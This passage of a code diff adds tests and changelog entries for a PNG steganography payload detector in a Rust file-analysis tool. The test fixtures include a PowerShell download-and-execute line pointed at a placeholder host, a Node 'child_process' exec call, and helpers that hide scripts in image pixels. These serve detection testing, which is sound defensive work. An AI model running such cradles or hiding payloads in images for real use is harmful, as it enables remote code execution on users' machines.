++    let (values, _) = probe(&hide(&payload, 3, &[0, 1, 2], 0, false, false), 3);
++    assert!(kinds(&values).contains(&"shell"));
++}
++
++#[test]
++fn reconstructs_direct_channel_bytes_and_transparent_rgb() {
++    let mut pixels = cover(4);
++    for (byte, target) in SCRIPT.iter().zip(pixels.iter_mut()) {
++        *target = *byte;
++    }
++    let (values, _) = probe(&pixels, 4);
++    assert!(kinds(&values).contains(&"shell"));
++    let mut pixels = cover(4);
++    for (pixel, bytes) in pixels
++        .as_chunks_mut::<4>()
++        .0
++        .iter_mut()
++        .zip(SCRIPT.chunks(3))
++    {
++        pixel[3] = 0;
++        pixel[..bytes.len()].copy_from_slice(bytes);
++    }
++    let (values, _) = probe(&pixels, 4);
++    assert!(kinds(&values).contains(&"shell"));
++    assert!(
++        values
++            .get("png.pixel_payloads")
++            .unwrap()
++            .to_string()
++            .contains("transparent-rgb")
++    );
++}
++
++#[test]
++fn checks_checksums_before_accepting_compressed_payload() {
++    let mut encoder = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::default());
++    encoder.write_all(SCRIPT).unwrap();
++    let compressed = encoder.finish().unwrap();
++    assert_eq!(decompress(&compressed).unwrap(), SCRIPT);
++    assert!(decompress(&compressed[..compressed.len() - 1]).is_none());
++    let mut corrupted = compressed.clone();
++    *corrupted.last_mut().unwrap() ^= 1;
++    assert!(decompress(&corrupted).is_none());
++    for payload in [
++        compressed.clone(),
++        STANDARD.encode(&compressed).into_bytes(),
++    ] {
++        let (values, _) = probe(&hide(&payload, 3, &[0, 1, 2], 0, false, false), 3);
++        assert!(kinds(&values).contains(&"shell"));
++    }
++}
++
++#[test]
++fn compression_bomb_and_weak_headers_do_not_make_payload_facts() {
++    let mut encoder = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::best());
++    encoder.write_all(&vec![b'A'; MAX_DECODED + 1]).unwrap();
++    assert!(decompress(&encoder.finish().unwrap()).is_none());
++    for data in [
++        b"MZ....not a portable executable".as_slice(),
++        b"PK\x03\x04bad archive",
++        b"#!/logo/image.png\nordinary metadata text",
++    ] {
++        assert!(content(data).is_none());
++    }
++}
++
++#[test]
++fn ordinary_gradients_noise_and_flat_pixels_are_not_recovered_payloads() {
++    for channels in [1, 2, 3, 4] {
++        assert!(kinds(&probe(&cover(channels), channels).0).is_empty());
++    }
++    let mut state = 0x12345678u32;
++    let noise: Vec<u8> = (0..WIDTH * HEIGHT * 3)
++        .map(|_| {
++            state ^= state << 13;
++            state ^= state >> 17;
++            state ^= state << 5;
++            state as u8
++        })
++        .collect();
++    assert!(kinds(&probe(&noise, 3).0).is_empty());
++    for byte in [0, b'c', 128, 255] {
++        assert!(kinds(&probe(&vec![byte; WIDTH * HEIGHT * 3], 3).0).is_empty());
++    }
++}
++
++#[test]
++fn simple_other_languages_and_utf16_are_recognized() {
++    for (text, kind) in [
++        ("import os\nos.system('printf fixture')\n", "python"),
++        (
++            "const cp = require('child_process'); cp.exec('id');\n",
++            "javascript",
++        ),
++        (
++            "$x = New-Object Net.WebClient; IEX($x.DownloadString('https://example.invalid/fixture'));",
++            "powershell",
++        ),
++    ] {
++        assert_eq!(content(text.as_bytes()).unwrap().0, kind);
++        let units: Vec<u8> = text.encode_utf16().flat_map(u16::to_le_bytes).collect();
++        let (values, _) = probe(&hide(&units, 3, &[0, 1, 2], 0, false, false), 3);
++        assert!(kinds(&values).contains(&kind));
++    }
++}
++
++#[test]
++fn bounds_and_malformed_dimensions_are_observable() {
++    let (mut values, mut metrics) = (Values::new(), Metrics::new());
++    extract(
++        &[],
++        usize::MAX,
++        usize::MAX,
++        4,
++        "u8",
++        &mut values,
++        &mut metrics,
++    );
++    assert!(values.get("png.limits").is_some());
++    let pixels = vec![0; 1024 * 1024 * 3];
++    extract(&pixels, 1024, 1024, 3, "u8", &mut values, &mut metrics);
++    assert!(metrics.get("png.pixel_payload_probe_steps").unwrap() <= (MAX_STEPS + 1) as f64);
++    assert_eq!(metrics.get("png.pixel_payload_limited"), Some(1.0));
++    assert!(kinds(&values).is_empty());
++}
++
++#[test]
++fn full_png_pipeline_recovers_low_bit_payload() {
++    let pixels = hide(SCRIPT, 3, &[0, 1, 2], 0, false, false);
++    let mut data = Vec::new();
++    {
++        let mut encoder = png::Encoder::new(&mut data, WIDTH as u32, HEIGHT as u32);
++        encoder.set_color(png::ColorType::Rgb);
++        encoder.set_depth(png::BitDepth::Eight);
++        encoder
++            .write_header()
++            .unwrap()
++            .write_image_data(&pixels)
++            .unwrap();
++    }
++    let (mut values, mut metrics, mut strings) = (
++        Values::new(),
++        Metrics::new(),
++        crate::output::Strings::default(),
++    );
++    super::super::png::extract(&data, &mut values, &mut strings, &mut metrics);
++    assert!(kinds(&values).contains(&"shell"));
++}
++
++#[test]
++fn simple_xor_and_hex_wrappers_preserve_script_evidence() {
++    let xor: Vec<u8> = SCRIPT.iter().map(|b| b ^ 0x5a).collect();
++    let hex: String = SCRIPT.iter().map(|b| format!("{b:02x}")).collect();
++    for payload in [xor, hex.into_bytes()] {
++        let (values, _) = probe(&hide(&payload, 3, &[0, 1, 2], 0, false, false), 3);
++        assert!(kinds(&values).contains(&"shell"));
++    }
++}
++
++#[test]
++fn palette_samples_and_sixteen_bit_lanes_are_decoded_before_probing() {
++    let hidden = hide(SCRIPT, 3, &[0], 0, false, false);
++    for sixteen in [false, true] {
++        let mut data = Vec::new();
++        {
++            let mut encoder = png::Encoder::new(&mut data, WIDTH as u32, HEIGHT as u32);
++            let samples = if sixteen {
++                encoder.set_color(png::ColorType::Rgb);
++                encoder.set_depth(png::BitDepth::Sixteen);
++                hidden
++                    .iter()
++                    .flat_map(|&low| [128, low])
++                    .collect::<Vec<_>>()
++            } else {
++                encoder.set_color(png::ColorType::Indexed);
++                encoder.set_depth(png::BitDepth::Eight);
++                encoder.set_palette((0..=255u8).flat_map(|v| [v, v, v]).collect::<Vec<_>>());
++                hidden
++                    .as_chunks::<3>()
++                    .0
++                    .iter()
++                    .map(|p| p[0])
++                    .collect::<Vec<_>>()
++            };
++            encoder
++                .write_header()
++                .unwrap()
++                .write_image_data(&samples)
++                .unwrap();
++        }
++        let (mut values, mut metrics, mut strings) = (
++            Values::new(),
++            Metrics::new(),
++            crate::output::Strings::default(),
++        );
++        super::super::png::extract(&data, &mut values, &mut strings, &mut metrics);
++        assert!(kinds(&values).contains(&"shell"));
++        assert_eq!(metrics.get("image.channels"), Some(3.0));
++        if sixteen {
++            assert_eq!(metrics.get("image.pixel_entropy"), Some(0.0));
++        }
++    }
++}
++
++#[test]
++fn structured_configuration_is_interesting_without_a_script() {
++    for (bytes, kind) in [
++        (
++            br#"{"server":"https://stage.example.invalid/update","delay":30}"#.as_slice(),
++            "json",
++        ),
++        (b"https://stage.example.invalid/update".as_slice(), "url"),
++    ] {
++        let (values, _) = probe(&hide(bytes, 3, &[0, 1, 2], 0, false, false), 3);
++        assert!(kinds(&values).contains(&kind));
++    }
++}
++
++#[test]
++fn large_binary_payload_keeps_header_evidence_when_tables_are_beyond_prefix() {
++    let mut header = vec![0u8; 64];
++    header[..7].copy_from_slice(b"\x7fELF\x02\x01\x01");
++    header[16..18].copy_from_slice(&2u16.to_le_bytes());
++    header[18..20].copy_from_slice(&62u16.to_le_bytes());
++    header[20..24].copy_from_slice(&1u32.to_le_bytes());
++    header[40..48].copy_from_slice(&8192u64.to_le_bytes());
++    header[52..54].copy_from_slice(&64u16.to_le_bytes());
++    header[58..60].copy_from_slice(&64u16.to_le_bytes());
++    header[60..62].copy_from_slice(&1u16.to_le_bytes());
++    assert_eq!(content(&header).unwrap().0, "elf-header");
++}
++
++#[test]
++fn reverse_pixel_directions_recover_simple_scripts() {
++    let ordinary = hide(SCRIPT, 3, &[0, 1, 2], 0, false, false);
++    for (flip_x, flip_y) in [(true, true), (true, false), (false, true)] {
++        let pixels: Vec<u8> = (0..HEIGHT)
++            .flat_map(|y| {
++                let ordinary = &ordinary;
++                (0..WIDTH).flat_map(move |x| {
++                    let xx = if flip_x { WIDTH - 1 - x } else { x };
++                    let yy = if flip_y { HEIGHT - 1 - y } else { y };
++                    ordinary[(yy * WIDTH + xx) * 3..(yy * WIDTH + xx) * 3 + 3]
++                        .iter()
++                        .copied()
++                })
++            })
++            .collect();
++        let (values, _) = probe(&pixels, 3);
++        assert!(kinds(&values).contains(&"shell"));
++    }
++}
+diff --git a/src/output/metric_keys.rs b/src/output/metric_keys.rs
+index ac8b2b3..6386737 100644
+--- a/src/output/metric_keys.rs
++++ b/src/output/metric_keys.rs
+@@ -788,6 +788,11 @@ pub const CATALOG: &[&str] = &[
+     "png.idat_chunk_count",
+     "png.idat_unused_bytes",
+     "png.idat_zlib_bytes",
++    "png.pixel_payload_count",
++    "png.pixel_payload_limited",
++    "png.pixel_payload_probe_bytes",
++    "png.pixel_payload_probe_count",
++    "png.pixel_payload_probe_steps",
+     "png.text_chunk_bytes",
+     "png.trailing_bytes",
+     "png.trailing_chunk_count",
+diff --git a/src/output/value_keys.rs b/src/output/value_keys.rs
+index 037f4fc..322883e 100644
+--- a/src/output/value_keys.rs
++++ b/src/output/value_keys.rs
+@@ -725,6 +725,7 @@ pub const VALUE_CATALOG: &[&str] = &[
+     "png.icc_profile_name",
+     "png.last_modified",
+     "png.limits",
++    "png.pixel_payloads",
+     "png.text",
+     "png.unknown_chunks",
+     "pyc.hash",
+diff --git a/src/formats/mod.rs b/src/formats/mod.rs
+--- a/src/formats/mod.rs
++++ b/src/formats/mod.rs
+@@ -158,6 +158,7 @@
+ mod pkgmeta;
+ mod plist_guard;
+ mod png;
++mod png_stego;
+ mod pyc;
+ mod python_sdist;
+ mod rar;
+diff --git a/src/lib.rs b/src/lib.rs
+--- a/src/lib.rs
++++ b/src/lib.rs
+@@ -249,7 +249,7 @@
+ /// non-breaking and do not bump this version. The on-disk cache has its own
+ /// format version, and never serves an entry written by another build of
+ /// filefacts: every cache key includes a hash of filefacts' source.
+-pub const SCHEMA_VERSION: &str = "10";
++pub const SCHEMA_VERSION: &str = "11";
+ 
+ /// A file with its bytes and lazily-computed metadata views.
+ ///
+diff --git a/CHANGELOG.md b/CHANGELOG.md
+--- a/CHANGELOG.md
++++ b/CHANGELOG.md
+@@ -10,6 +10,12 @@
+ 
+ ### Added
+ 
++- Bounded PNG pixel-payload probes for channel/bit-plane packing, traversal
++  swaps, prime pixels and transparent RGB; Base64, hex, UTF-16, single-byte
++  XOR, and checksum-validated zlib/gzip transforms. Script, configuration and
++  binary-format recognition emit recovered layouts and bounded previews in
++  `png.pixel_payloads`; probe budgets and limits are observable without
++  treating random pixels alone as a recovered payload.
+ - `Registry::favorites` and the `registry.favorites` metric: stars, likes,
+   or favers, a popularity count with no score behind it (unlike
+   `rating_count`, the votes behind `rating`).
+@@ -51,7 +57,9 @@
+ 
+ ### Changed
+ 
+-- **`SCHEMA_VERSION` is now `10`.** Renamed or reshaped keys:
++- **`SCHEMA_VERSION` is now `11`.** Renamed or reshaped keys:
++  - PNG `image.*` statistics normalize palette and 16-bit samples rather than
++    counting palette indices or alternating bytes as color samples.
+   - `cert_chain_depth` → `cert_bag_size` in every signature object;
+     timestamp times are RFC 3339.
+   - `elf.hashes.imphash` → `elf.hashes.import_hash`,
